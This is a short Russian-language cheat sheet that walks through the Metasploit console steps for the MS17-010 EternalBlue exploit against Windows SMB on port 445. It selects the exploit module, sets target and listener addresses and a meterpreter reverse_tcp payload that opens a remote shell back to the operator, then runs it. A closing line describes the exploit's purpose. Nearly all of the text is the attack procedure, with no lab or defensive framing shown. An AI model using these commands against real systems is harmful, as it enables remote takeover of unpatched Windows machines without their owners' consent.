```
msfconsole
```

```
search ms17_010
```

```
exploit/windows/smb/ms17_010_eternalblue
```

Установите параметры:
```
set RHOST <$REMOTE_IP>
set LHOST <$LOCAL_IP>
set LPORT <$LOCAL_PORT>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

```
exploit
```

> Представляет собой код для удаленной эксплуатации подверженных этой уязвимости версий Microsoft Windows, действует в отношении сервиса SMB, который как правило использует порт 445